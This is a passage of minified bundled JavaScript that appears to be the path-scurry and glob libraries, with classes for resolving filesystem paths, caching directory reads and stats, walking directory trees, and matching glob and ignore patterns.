this.#O;let X=this.name,J=this.parent;if(!J)return this.#O=this.name;let Y=J.fullpath()+(!J.parent?"":this.sep)+X;return this.#O=Y}fullpathPosix(){if(this.#D!==void 0)return this.#D;if(this.sep==="/")return this.#D=this.fullpath();if(!this.parent){let Y=this.fullpath().replace(/\\/g,"/");if(/^[a-z]:\//i.test(Y))return this.#D=`//?/${Y}`;else return this.#D=Y}let X=this.parent,J=X.fullpathPosix(),Q=J+(!J||!X.parent?"":"/")+this.name;return this.#D=Q}isUnknown(){return(this.#Y&M8)===F8}isType(X){return this[`is${X}`]()}getType(){return this.isUnknown()?"Unknown":this.isDirectory()?"Directory":this.isFile()?"File":this.isSymbolicLink()?"SymbolicLink":this.isFIFO()?"FIFO":this.isCharacterDevice()?"CharacterDevice":this.isBlockDevice()?"BlockDevice":this.isSocket()?"Socket":"Unknown"}isFile(){return(this.#Y&M8)===BD}isDirectory(){return(this.#Y&M8)===H6}isCharacterDevice(){return(this.#Y&M8)===KD}isBlockDevice(){return(this.#Y&M8)===VD}isFIFO(){return(this.#Y&M8)===UD}isSocket(){return(this.#Y&M8)===qD}isSymbolicLink(){return(this.#Y&JJ)===JJ}lstatCached(){return this.#Y&QD?this:void 0}readlinkCached(){return this.#_}realpathCached(){return this.#I}readdirCached(){let X=this.children();return X.slice(0,X.provisional)}canReadlink(){if(this.#_)return!0;if(!this.parent)return!1;let X=this.#Y&M8;return!(X!==F8&&X!==JJ||this.#Y&E2||this.#Y&g8)}calledReaddir(){return!!(this.#Y&mH)}isENOENT(){return!!(this.#Y&g8)}isNamed(X){return!this.nocase?this.#w===PQ(X):this.#w===$2(X)}async readlink(){let X=this.#_;if(X)return X;if(!this.canReadlink())return;if(!this.parent)return;try{let J=await this.#X.promises.readlink(this.fullpath()),Q=(await this.parent.realpath())?.resolve(J);if(Q)return this.#_=Q}catch(J){this.#c(J.code);return}}readlinkSync(){let X=this.#_;if(X)return X;if(!this.canReadlink())return;if(!this.parent)return;try{let J=this.#X.readlinkSync(this.fullpath()),Q=this.parent.realpathSync()?.resolve(J);if(Q)return this.#_=Q}catch(J){this.#c(J.code);return}}#C(X){this.#Y|=mH;for(let J=X.provisional;J<X.length;J++){let Q=X[J];if(Q)Q.#h()}}#h(){if(this.#Y&g8)return;this.#Y=(this.#Y|g8)&wQ,this.#v()}#v(){let X=this.children();X.provisional=0;for(let J of X)J.#h()}#y(){this.#Y|=k2,this.#x()}#x(){if(this.#Y&CQ)return;let X=this.#Y;if((X&M8)===H6)X&=wQ;this.#Y=X|CQ,this.#v()}#E(X=""){if(X==="ENOTDIR"||X==="EPERM")this.#x();else if(X==="ENOENT")this.#h();else this.children().provisional=0}#k(X=""){if(X==="ENOTDIR")this.parent.#x();else if(X==="ENOENT")this.#h()}#c(X=""){let J=this.#Y;if(J|=E2,X==="ENOENT")J|=g8;if(X==="EINVAL"||X==="UNKNOWN")J&=wQ;if(this.#Y=J,X==="ENOTDIR"&&this.parent)this.parent.#x()}#f(X,J){return this.#K(X,J)||this.#l(X,J)}#l(X,J){let Q=uH(X),Y=this.newChild(X.name,Q,{parent:this}),W=Y.#Y&M8;if(W!==H6&&W!==JJ&&W!==F8)Y.#Y|=CQ;return J.unshift(Y),J.provisional++,Y}#K(X,J){for(let Q=J.provisional;Q<J.length;Q++){let Y=J[Q];if((this.nocase?$2(X.name):PQ(X.name))!==Y.#w)continue;return this.#p(X,Y,Q,J)}}#p(X,J,Q,Y){let W=J.name;if(J.#Y=J.#Y&wQ|uH(X),W!==X.name)J.name=X.name;if(Q!==Y.provisional){if(Q===Y.length-1)Y.pop();else Y.splice(Q,1);Y.unshift(J)}return Y.provisional++,J}async lstat(){if((this.#Y&g8)===0)try{return this.#g(await this.#X.promises.lstat(this.fullpath())),this}catch(X){this.#k(X.code)}}lstatSync(){if((this.#Y&g8)===0)try{return this.#g(this.#X.lstatSync(this.fullpath())),this}catch(X){this.#k(X.code)}}#g(X){let{atime:J,atimeMs:Q,birthtime:Y,birthtimeMs:W,blksize:z,blocks:G,ctime:H,ctimeMs:U,dev:K,gid:V,ino:B,mode:Z,mtime:M,mtimeMs:F,nlink:j,rdev:O,size:N,uid:A}=X;this.#A=J,this.#U=Q,this.#j=Y,this.#L=W,this.#V=z,this.#B=G,this.#T=H,this.#M=U,this.#J=K,this.#N=V,this.#H=B,this.#G=Z,this.#F=M,this.#Q=F,this.#W=j,this.#R=O,this.#q=N,this.#z=A;let D=uH(X);if(this.#Y=this.#Y&wQ|D|QD,D!==F8&&D!==H6&&D!==JJ)this.#Y|=CQ}#$=[];#m=!1;#i(X){this.#m=!1;let J=this.#$.slice();this.#$.length=0,J.forEach((Q)=>Q(null,X))}readdirCB(X,J=!1){if(!this.canReaddir()){if(J)X(null,[]);else queueMicrotask(()=>X(null,[]));return}let Q=this.children();if(this.calledReaddir()){let W=Q.slice(0,Q.provisional);if(J)X(null,W);else queueMicrotask(()=>X(null,W));return}if(this.#$.push(X),this.#m)return;this.#m=!0;let Y=this.fullpath();this.#X.readdir(Y,{withFileTypes:!0},(W,z)=>{if(W)this.#E(W.code),Q.provisional=0;else{for(let G of z)this.#f(G,Q);this.#C(Q)}this.#i(Q.slice(0,Q.provisional));return})}#d;async readdir(){if(!this.canReaddir())return[];let X=this.children();if(this.calledReaddir())return X.slice(0,X.provisional);let J=this.fullpath();if(this.#d)await this.#d;else{let Q=()=>{};this.#d=new Promise((Y)=>Q=Y);try{for(let Y of await this.#X.promises.readdir(J,{withFileTypes:!0}))this.#f(Y,X);this.#C(X)}catch(Y){this.#E(Y.code),X.provisional=0}this.#d=void 0,Q()}return X.slice(0,X.provisional)}readdirSync(){if(!this.canReaddir())return[];let X=this.children();if(this.calledReaddir())return X.slice(0,X.provisional);let J=this.fullpath();try{for(let Q of this.#X.readdirSync(J,{withFileTypes:!0}))this.#f(Q,X);this.#C(X)}catch(Q){this.#E(Q.code),X.provisional=0}return X.slice(0,X.provisional)}canReaddir(){if(this.#Y&YD)return!1;let X=M8&this.#Y;if(!(X===F8||X===H6||X===JJ))return!1;return!0}shouldWalk(X,J){return(this.#Y&H6)===H6&&!(this.#Y&YD)&&!X.has(this)&&(!J||J(this))}async realpath(){if(this.#I)return this.#I;if((k2|E2|g8)&this.#Y)return;try{let X=await this.#X.promises.realpath(this.fullpath());return this.#I=this.resolve(X)}catch(X){this.#y()}}realpathSync(){if(this.#I)return this.#I;if((k2|E2|g8)&this.#Y)return;try{let X=this.#X.realpathSync(this.fullpath());return this.#I=this.resolve(X)}catch(X){this.#y()}}[MD](X){if(X===this)return;X.isCWD=!1,this.isCWD=!0;let J=new Set([]),Q=[],Y=this;while(Y&&Y.parent)J.add(Y),Y.#S=Q.join(this.sep),Y.#Z=Q.join("/"),Y=Y.parent,Q.push("..");Y=X;while(Y&&Y.parent&&!J.has(Y))Y.#S=void 0,Y.#Z=void 0,Y=Y.parent}};b2=class b2 extends v9{sep="\\";splitSep=Yu1;constructor(X,J=F8,Q,Y,W,z,G){super(X,J,Q,Y,W,z,G)}newChild(X,J=F8,Q={}){return new b2(X,J,this.root,this.roots,this.nocase,this.childrenCache(),Q)}getRootString(X){return cH.parse(X).root}getRoot(X){if(X=Qu1(X.toUpperCase()),X===this.root.name)return this.root;for(let[J,Q]of Object.entries(this.roots))if(this.sameRoot(X,J))return this.roots[X]=Q;return this.roots[X]=new SQ(X,this).root}sameRoot(X,J=this.root.name){return X=X.toUpperCase().replace(/\//g,"\\").replace(HD,"$1\\"),X===J}};v2=class v2 extends v9{splitSep="/";sep="/";constructor(X,J=F8,Q,Y,W,z,G){super(X,J,Q,Y,W,z,G)}getRootString(X){return X.startsWith("/")?"/":""}getRoot(X){return this.root}newChild(X,J=F8,Q={}){return new v2(X,J,this.root,this.roots,this.nocase,this.childrenCache(),Q)}};pH=class pH{root;rootPath;roots;cwd;#X;#J;#G;nocase;#W;constructor(X=process.cwd(),J,Q,{nocase:Y,childrenCacheSize:W=16384,fs:z=IQ}={}){if(this.#W=zD(z),X instanceof URL||X.startsWith("file://"))X=pm1(X);let G=J.resolve(X);this.roots=Object.create(null),this.rootPath=this.parseRootPath(G),this.#X=new lH,this.#J=new lH,this.#G=new ZD(W);let H=G.substring(this.rootPath.length).split(Q);if(H.length===1&&!H[0])H.pop();if(Y===void 0)throw new TypeError("must provide nocase setting to PathScurryBase ctor");this.nocase=Y,this.root=this.newRoot(this.#W),this.roots[this.rootPath]=this.root;let U=this.root,K=H.length-1,V=J.sep,B=this.rootPath,Z=!1;for(let M of H){let F=K--;U=U.child(M,{relative:new Array(F).fill("..").join(V),relativePosix:new Array(F).fill("..").join("/"),fullpath:B+=(Z?"":V)+M}),Z=!0}this.cwd=U}depth(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.depth()}childrenCache(){return this.#G}resolve(...X){let J="";for(let W=X.length-1;W>=0;W--){let z=X[W];if(!z||z===".")continue;if(J=J?`${z}/${J}`:z,this.isAbsolute(z))break}let Q=this.#X.get(J);if(Q!==void 0)return Q;let Y=this.cwd.resolve(J).fullpath();return this.#X.set(J,Y),Y}resolvePosix(...X){let J="";for(let W=X.length-1;W>=0;W--){let z=X[W];if(!z||z===".")continue;if(J=J?`${z}/${J}`:z,this.isAbsolute(z))break}let Q=this.#J.get(J);if(Q!==void 0)return Q;let Y=this.cwd.resolve(J).fullpathPosix();return this.#J.set(J,Y),Y}relative(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.relative()}relativePosix(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.relativePosix()}basename(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.name}dirname(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return(X.parent||X).fullpath()}async readdir(X=this.cwd,J={withFileTypes:!0}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X,X=this.cwd;let{withFileTypes:Q}=J;if(!X.canReaddir())return[];else{let Y=await X.readdir();return Q?Y:Y.map((W)=>W.name)}}readdirSync(X=this.cwd,J={withFileTypes:!0}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X,X=this.cwd;let{withFileTypes:Q=!0}=J;if(!X.canReaddir())return[];else if(Q)return X.readdirSync();else return X.readdirSync().map((Y)=>Y.name)}async lstat(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.lstat()}lstatSync(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.lstatSync()}async readlink(X=this.cwd,{withFileTypes:J}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X.withFileTypes,X=this.cwd;let Q=await X.readlink();return J?Q:Q?.fullpath()}readlinkSync(X=this.cwd,{withFileTypes:J}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X.withFileTypes,X=this.cwd;let Q=X.readlinkSync();return J?Q:Q?.fullpath()}async realpath(X=this.cwd,{withFileTypes:J}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X.withFileTypes,X=this.cwd;let Q=await X.realpath();return J?Q:Q?.fullpath()}realpathSync(X=this.cwd,{withFileTypes:J}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X.withFileTypes,X=this.cwd;let Q=X.realpathSync();return J?Q:Q?.fullpath()}async walk(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:z}=J,G=[];if(!W||W(X))G.push(Q?X:X.fullpath());let H=new Set,U=(V,B)=>{H.add(V),V.readdirCB((Z,M)=>{if(Z)return B(Z);let F=M.length;if(!F)return B();let j=()=>{if(--F===0)B()};for(let O of M){if(!W||W(O))G.push(Q?O:O.fullpath());if(Y&&O.isSymbolicLink())O.realpath().then((N)=>N?.isUnknown()?N.lstat():N).then((N)=>N?.shouldWalk(H,z)?U(N,j):j());else if(O.shouldWalk(H,z))U(O,j);else j()}},!0)},K=X;return new Promise((V,B)=>{U(K,(Z)=>{if(Z)return B(Z);V(G)})})}walkSync(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:z}=J,G=[];if(!W||W(X))G.push(Q?X:X.fullpath());let H=new Set([X]);for(let U of H){let K=U.readdirSync();for(let V of K){if(!W||W(V))G.push(Q?V:V.fullpath());let B=V;if(V.isSymbolicLink()){if(!(Y&&(B=V.realpathSync())))continue;if(B.isUnknown())B.lstatSync()}if(B.shouldWalk(H,z))H.add(B)}}return G}[Symbol.asyncIterator](){return this.iterate()}iterate(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X,X=this.cwd;return this.stream(X,J)[Symbol.asyncIterator]()}[Symbol.iterator](){return this.iterateSync()}*iterateSync(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:z}=J;if(!W||W(X))yield Q?X:X.fullpath();let G=new Set([X]);for(let H of G){let U=H.readdirSync();for(let K of U){if(!W||W(K))yield Q?K:K.fullpath();let V=K;if(K.isSymbolicLink()){if(!(Y&&(V=K.realpathSync())))continue;if(V.isUnknown())V.lstatSync()}if(V.shouldWalk(G,z))G.add(V)}}}stream(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:z}=J,G=new XJ({objectMode:!0});if(!W||W(X))G.write(Q?X:X.fullpath());let H=new Set,U=[X],K=0,V=()=>{let B=!1;while(!B){let Z=U.shift();if(!Z){if(K===0)G.end();return}K++,H.add(Z);let M=(j,O,N=!1)=>{if(j)return G.emit("error",j);if(Y&&!N){let A=[];for(let D of O)if(D.isSymbolicLink())A.push(D.realpath().then((S)=>S?.isUnknown()?S.lstat():S));if(A.length){Promise.all(A).then(()=>M(null,O,!0));return}}for(let A of O)if(A&&(!W||W(A))){if(!G.write(Q?A:A.fullpath()))B=!0}K--;for(let A of O){let D=A.realpathCached()||A;if(D.shouldWalk(H,z))U.push(D)}if(B&&!G.flowing)G.once("drain",V);else if(!F)V()},F=!0;Z.readdirCB(M,!0),F=!1}};return V(),G}streamSync(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:z}=J,G=new XJ({objectMode:!0}),H=new Set;if(!W||W(X))G.write(Q?X:X.fullpath());let U=[X],K=0,V=()=>{let B=!1;while(!B){let Z=U.shift();if(!Z){if(K===0)G.end();return}K++,H.add(Z);let M=Z.readdirSync();for(let F of M)if(!W||W(F)){if(!G.write(Q?F:F.fullpath()))B=!0}K--;for(let F of M){let j=F;if(F.isSymbolicLink()){if(!(Y&&(j=F.realpathSync())))continue;if(j.isUnknown())j.lstatSync()}if(j.shouldWalk(H,z))U.push(j)}}if(B&&!G.flowing)G.once("drain",V)};return V(),G}chdir(X=this.cwd){let J=this.cwd;this.cwd=typeof X==="string"?this.cwd.resolve(X):X,this.cwd[MD](J)}};SQ=class SQ extends pH{sep="\\";constructor(X=process.cwd(),J={}){let{nocase:Q=!0}=J;super(X,cH,"\\",{...J,nocase:Q});this.nocase=Q;for(let Y=this.cwd;Y;Y=Y.parent)Y.nocase=this.nocase}parseRootPath(X){return cH.parse(X).root.toUpperCase()}newRoot(X){return new b2(this.rootPath,H6,void 0,this.roots,this.nocase,this.childrenCache(),{fs:X})}isAbsolute(X){return X.startsWith("/")||X.startsWith("\\")||/^[a-z]:(\/|\\)/i.test(X)}};TQ=class TQ extends pH{sep="/";constructor(X=process.cwd(),J={}){let{nocase:Q=!1}=J;super(X,lm1,"/",{...J,nocase:Q});this.nocase=Q}parseRootPath(X){return"/"}newRoot(X){return new v2(this.rootPath,H6,void 0,this.roots,this.nocase,this.childrenCache(),{fs:X})}isAbsolute(X){return X.startsWith("/")}};x2=class x2 extends TQ{constructor(X=process.cwd(),J={}){let{nocase:Q=!0}=J;super(X,{...J,nocase:Q})}};r60=process.platform==="win32"?b2:v2,FD=process.platform==="win32"?SQ:process.platform==="darwin"?x2:TQ});class T7{#X;#J;#G;length;#W;#z;#N;#R;#V;#H;#q=!0;constructor(X,J,Q,Y){if(!Gu1(X))throw new TypeError("empty pattern list");if(!zu1(J))throw new TypeError("empty glob list");if(J.length!==X.length)throw new TypeError("mismatched pattern list and glob list lengths");if(this.length=X.length,Q<0||Q>=this.length)throw new TypeError("index out of range");if(this.#X=X,this.#J=J,this.#G=Q,this.#W=Y,this.#G===0){if(this.isUNC()){let[W,z,G,H,...U]=this.#X,[K,V,B,Z,...M]=this.#J;if(U[0]==="")U.shift(),M.shift();let F=[W,z,G,H,""].join("/"),j=[K,V,B,Z,""].join("/");this.#X=[F,...U],this.#J=[j,...M],this.length=this.#X.length}else if(this.isDrive()||this.isAbsolute()){let[W,...z]=this.#X,[G,...H]=this.#J;if(z[0]==="")z.shift(),H.shift();let U=W+"/",K=G+"/";this.#X=[U,...z],this.#J=[K,...H],this.length=this.#X.length}}}pattern(){return this.#X[this.#G]}isString(){return typeof this.#X[this.#G]==="string"}isGlobstar(){return this.#X[this.#G]===Z9}isRegExp(){return this.#X[this.#G]instanceof RegExp}globString(){return this.#N=this.#N||(this.#G===0?this.isAbsolute()?this.#J[0]+this.#J.slice(1).join("/"):this.#J.join("/"):this.#J.slice(this.#G).join("/"))}hasMore(){return this.length>this.#G+1}rest(){if(this.#z!==void 0)return this.#z;if(!this.hasMore())return this.#z=null;return this.#z=new T7(this.#X,this.#J,this.#G+1,this.#W),this.#z.#H=this.#H,this.#z.#V=this.#V,this.#z.#R=this.#R,this.#z}isUNC(){let X=this.#X;return this.#V!==void 0?this.#V:this.#V=this.#W==="win32"&&this.#G===0&&X[0]===""&&X[1]===""&&typeof X[2]==="string"&&!!X[2]&&typeof X[3]==="string"&&!!X[3]}isDrive(){let X=this.#X;return this.#R!==void 0?this.#R:this.#R=this.#W==="win32"&&this.#G===0&&this.length>1&&typeof X[0]==="string"&&/^[a-z]:$/i.test(X[0])}isAbsolute(){let X=this.#X;return this.#H!==void 0?this.#H:this.#H=X[0]===""&&X.length>1||this.isDrive()||this.isUNC()}root(){let X=this.#X[0];return typeof X==="string"&&this.isAbsolute()&&this.#G===0?X:""}checkFollowGlobstar(){return!(this.#G===0||!this.isGlobstar()||!this.#q)}markFollowGlobstar(){if(this.#G===0||!this.isGlobstar()||!this.#q)return!1;return this.#q=!1,!0}}var Gu1=(X)=>X.length>=1,zu1=(X)=>X.length>=1;var dH=j1(()=>{UX()});class _Q{relative;relativeChildren;absolute;absoluteChildren;platform;mmopts;constructor(X,{nobrace:J,nocase:Q,noext:Y,noglobstar:W,platform:z=Hu1}){this.relative=[],this.absolute=[],this.relativeChildren=[],this.absoluteChildren=[],this.platform=z,this.mmopts={dot:!0,nobrace:J,nocase:Q,noext:Y,noglobstar:W,optimizationLevel:2,platform:z,nocomment:!0,nonegate:!0};for(let G of X)this.add(G)}add(X){let J=new Z8(X,this.mmopts);for(let Q=0;Q<J.set.length;Q++){let Y=J.set[Q],W=J.globParts[Q];if(!Y||!W)throw new Error("invalid pattern object");while(Y[0]==="."&&W[0]===".")Y.shift(),W.shift();let z=new T7(Y,W,0,this.platform),G=new Z8(z.globString(),this.mmopts),H=W[W.length-1]==="**",U=z.isAbsolute();if(U)this.absolute.push(G);else this.relative.push(G);if(H)if(U)this.absoluteChildren.push(G);else this.relativeChildren.push(G)}}ignored(X){let J=X.fullpath(),Q=`${J}/`,Y=X.relative()||".",W=`${Y}/`;for(let z of this.relative)if(z.match(Y)||z.match(W))return!0;for(let z of this.absolute)if(z.match(J)||z.match(Q))return!0;return!1}childrenIgnored(X){let J=X.fullpath()+"/",Q=(X.relative()||".")+"/";for(let Y of this.relativeChildren)if(Y.match(Q))return!0;for(let Y of this.absoluteChildren)if(Y.match(J))return!0;return!1}}var Hu1;var iH=j1(()=>{UX();dH();Hu1=typeof process==="object"&&process&&typeof process.platform==="string"?process.platform:"linux"});class rH{store;constructor(X=new Map){this.store=X}copy(){return new rH(new Map(this.store))}hasWalked(X,J){return this.store.get(X.fullpath())?.has(J.globString())}storeWalked(X,J){let Q=X.fullpath(),Y=this.store.get(Q);if(Y)Y.add(J.globString());else this.store.set(Q,new Set([J.globString()]))}}class OD{store=new Map;add(X,J,Q){let Y=(J?2:0)|(Q?1:0),W=this.store.get(X);this.store.set(X,W===void 0?Y:Y&W)}entries(){return[...this.store.entries()].map(([X,J])=>[X,!!(J&2),!!(J&1)])}}class RD{store=new Map;add(X,J){if(!X.canReaddir())return;let Q=this.store.get(X);if(Q){if(!Q.find((Y)=>Y.globString()===J.globString()))Q.push(J)}else this.store.set(X,[J])}get(X){let J=this.store.get(X);if(!J)throw new Error("attempting to walk unknown path");return J}entries(){return this.keys().map((X)=>[X,this.store.get(X)])}keys(){return[...this.store.keys()].filter((X)=>X.canReaddir())}}class EQ{hasWalkedCache;matches=new OD;subwalks=new RD;patterns;follow;dot;opts;constructor(X,J){this.opts=X,this.follow=!!X.follow,this.dot=!!X.dot,this.hasWalkedCache=J?J.copy():new rH}processPatterns(X,J){this.patterns=J;let Q=J.map((Y)=>[X,Y]);for(let[Y,W]of Q){this.hasWalkedCache.storeWalked(Y,W);let z=W.root(),G=W.isAbsolute()&&this.opts.absolute!==!1;if(z){Y=Y.resolve(z==="/"&&this.opts.root!==void 0?this.opts.root:z);let V=W.rest();if(!V){this.matches.add(Y,!0,!1);continue}else W=V}if(Y.isENOENT())continue;let H,U,K=!1;while(typeof(H=W.pattern())==="string"&&(U=W.rest()))Y=Y.resolve(H),W=U,K=!0;if(H=W.pattern(),U=W.rest(),K){if(this.hasWalkedCache.hasWalked(Y,W))continue;this.hasWalkedCache.storeWalked(Y,W)}if(typeof H==="string"){let V=H===".."||H===""||H===".";this.matches.add(Y.resolve(H),G,V);continue}else if(H===Z9){if(!Y.isSymbolicLink()||this.follow||W.checkFollowGlobstar())this.subwalks.add(Y,W);let V=U?.pattern(),B=U?.rest();if(!U||(V===""||V===".")&&!B)this.matches.add(Y,G,V===""||V===".");else if(V===".."){let Z=Y.parent||Y;if(!B)this.matches.add(Z,G,!0);else if(!this.hasWalkedCache.hasWalked(Z,B))this.subwalks.add(Z,B)}}else if(H instanceof RegExp)this.subwalks.add(Y,W)}return this}subwalkTargets(){return this.subwalks.keys()}child(){return new EQ(this.opts,this.hasWalkedCache)}filterEntries(X,J){let Q=this.subwalks.get(X),Y=this.child();for(let W of J)for(let z of Q){let G=z.isAbsolute(),H=z.pattern(),U=z.rest();if(H===Z9)Y.testGlobstar(W,z,U,G);else if(H instanceof RegExp)Y.testRegExp(W,H,U,G);else Y.testString(W,H,U,G)}return Y}testGlobstar(X,J,Q,Y){if(this.dot||!X.name.startsWith(".")){if(!J.hasMore())this.matches.add(X,Y,!1);if(X.canReaddir()){if(this.follow||!X.isSymbolicLink())this.subwalks.add(X,J);else if(X.isSymbolicLink()){if(Q&&J.checkFollowGlobstar())this.subwalks.add(X,Q);else if(J.markFollowGlobstar())this.subwalks.add(X,J)}}}if(Q){let W=Q.pattern();if(typeof W==="string"&&W!==".."&&W!==""&&W!==".")this.testString(X,W,Q.rest(),Y);else if(W===".."){let z=X.parent||X;this.subwalks.add(z,Q)}else if(W instanceof RegExp)this.testRegExp(X,W,Q.rest(),Y)}}testRegExp(X,J,Q,Y){if(!J.test(X.name))return;if(!Q)this.matches.add(X,Y,!1);else this.subwalks.add(X,Q)}testString(X,J,Q,Y){if(!X.isNamed(J))return;if(!Q)this.matches.add(X,Y,!1);else this.subwalks.add(X,Q)}}var AD=j1(()=>{UX()});class nH{path;patterns;opts;seen=new Set;paused=!1;aborted=!1;#X=[];#J;#G;signal;maxDepth;includeChildMatches;constructor(X,J,Q){if(this.patterns=X,this.path=J,this.opts=Q,this.#G=!Q.posix&&Q.platform==="win32"?"\\":"/",this.includeChildMatches=Q.includeChildMatches!==!1,Q.ignore||!this.includeChildMatches){if(this.#J=Uu1(Q.ignore??[],Q),!this.includeChildMatches&&typeof this.#J.add!=="function")throw new Error("cannot ignore child matches, ignore lacks add() method.")}if(this.maxDepth=Q.maxDepth||1/0,Q.signal)this.signal=Q.signal,this.signal.addEventListener("abort",()=>{this.#X.length=0})}#W(X){return this.seen.has(X)||!!this.#J?.ignored?.(X)}#z(X){return!!this.#J?.childrenIgnored?.(X)}pause(){this.paused=!0}resume(){if(this.signal?.aborted)return;this.paused=!1;let X=void 0;while(!this.paused&&(X=this.#X.shift()))X()}onResume(X){if(this.signal?.aborted)return;if(!this.paused)X();else this.#X.push(X)}async matchCheck(X,J){if(J&&this.opts.nodir)return;let Q;if(this.opts.realpath){if(Q=X.realpathCached()||await X.realpath(),!Q)return;X=Q}let W=X.isUnknown()||this.opts.stat?await X.lstat():X;if(this.opts.follow&&this.opts.nodir&&W?.isSymbolicLink()){let z=await W.realpath();if(z&&(z.isUnknown()||this.opts.stat))await z.lstat()}return this.matchCheckTest(W,J)}matchCheckTest(X,J){return X&&(this.maxDepth===1/0||X.depth()<=this.maxDepth)&&(!J||X.canReaddir())&&(!this.opts.nodir||!X.isDirectory())&&(!this.opts.nodir||!this.opts.follow||!X.isSymbolicLink()||!X.realpathCached()?.isDirectory())&&!this.#W(X)?X:void 0}matchCheckSync(X,J){if(J&&this.opts.nodir)return;let Q;if(this.opts.realpath){if(Q=X.realpathCached()||X.realpathSync(),!Q)return;X=Q}let W=X.isUnknown()||this.opts.stat?X.lstatSync():X;if(this.opts.follow&&this.opts.nodir&&W?.isSymbolicLink()){let z=W.realpathSync();if(z&&(z?.isUnknown()||this.opts.stat))z.lstatSync()}return this.matchCheckTest(W,J)}matchFinish(X,J){if(this.#W(X))return;if(!this.includeChildMatches&&this.#J?.add){let W=`${X.relativePosix()}/**`;this.#J.add(W)}let Q=this.opts.absolute===void 0?J:this.opts.absolute;this.seen.add(X);let Y=this.opts.mark&&X.isDirectory()?this.#G:"";if(this.opts.withFileTypes)this.matchEmit(X);else if(Q){let W=this.opts.posix?X.fullpathPosix():X.fullpath();this.matchEmit(W+Y)}else{let W=this.opts.posix?X.relativePosix():X.relative(),z=this.opts.dotRelative&&!W.startsWith(".."+this.#G)?"."+this.#G:"";this.matchEmit(!W?"."+Y:z+W+Y)}}async match(X,J,Q){let Y=await this.matchCheck(X,Q);if(Y)this.matchFinish(Y,J)}matchSync(X,J,Q){let Y=this.matchCheckSync(X,Q);if(Y)this.matchFinish(Y,J)}walkCB(X,J,Q){if(this.signal?.aborted)Q();this.walkCB2(X,J,new EQ(this.opts),Q)}walkCB2(X,J,Q,Y){if(this.#z(X))return Y();if(this.signal?.aborted)Y();if(this.paused){this.onResume(()=>this.walkCB2(X,J,Q,Y));return}Q.processPatterns(X,J);let W=1,z=()=>{if(--W===0)Y()};for(let[G,H,U]of Q.matches.entries()){if(this.#W(G))continue;W++,this.match(G,H,U).then(()=>z())}for(let G of Q.subwalkTargets()){if(this.maxDepth!==1/0&&G.depth()>=this.maxDepth)continue;W++;let H=G.readdirCached();if(G.calledReaddir())this.walkCB3(G,H,Q,z);else G.readdirCB((U,K)=>this.walkCB3(G,K,Q,z),!0)}z()}walkCB3(X,J,Q,Y){Q=Q.filterEntries(X,J);let W=1,z=()=>{if(--W===0)Y()};for(let[G,H,U]of Q.matches.entries()){if(this.#W(G))continue;W++,this.match(G,H,U).then(()=>z())}for(let[G,H]of Q.subwalks.entries())W++,this.walkCB2(G,H,Q.child(),z);z()}walkCBSync(X,J,Q){if(this.signal?.aborted)Q();this.walkCB2Sync(X,J,new EQ(this.opts),Q)}walkCB2Sync(X,J,Q,Y){if(this.#z(X))return Y();if(this.signal?.aborted)Y();if(this.paused){this.onResume(()=>this.walkCB2Sync(X,J,Q,Y));return}Q.processPatterns(X,J);let W=1,z=()=>{if(--W===0)Y()};for(let[G,H,U]of Q.matches.entries()){if(this.#W(G))continue;this.matchSync(G,H,U)}for(let G of Q.subwalkTargets()){if(this.maxDepth!==1/0&&G.depth()>=this.maxDepth)continue;W++;let H=G.readdirSync();this.walkCB3Sync(G,H,Q,z)}z()}walkCB3Sync(X,J,Q,Y){Q=Q.filterEntries(X,J);let W=1,z=()=>{if(--W===0)Y()};for(let[G,H,U]of Q.matches.entries()){if(this.#W(G))continue;this.matchSync(G,H,U)}for(let[G,H]of Q.subwalks.entries())W++,this.walkCB2Sync(G,H,Q.child(),z);z()}}var Uu1=(X,J)=>typeof X==="string"?new _Q([X],J):Array.isArray(X)?new _Q(X,J):X,f2,g2;var ND=j1(()=>{yH();iH();AD();f2=class f2 extends nH{matches=new Set;constructor(X,J,Q){super(X,J,Q)}matchEmit(X){this.matches.add(X)}async walk(){if(this.signal?.aborted)throw this.signal.reason;if(this.path.isUnknown())await this.path.lstat();return await new Promise((X,J)=>{this.walkCB(this.path,this.patterns,()=>{if(this.signal?.aborted)J(this.signal.reason);else X(this.matches)})}),this.matches}walkSync(){if(this.signal?.aborted)throw this.signal.reason;if(this.path.isUnknown())this.path.lstatSync();return this.walkCBSync(this.path,this.patterns,()=>{if(this.signal?.aborted)throw this.signal.reason}),this.matches}};g2=class g2 extends nH{results;constructor(X,J,Q){super(X,J,Q);this.results=new 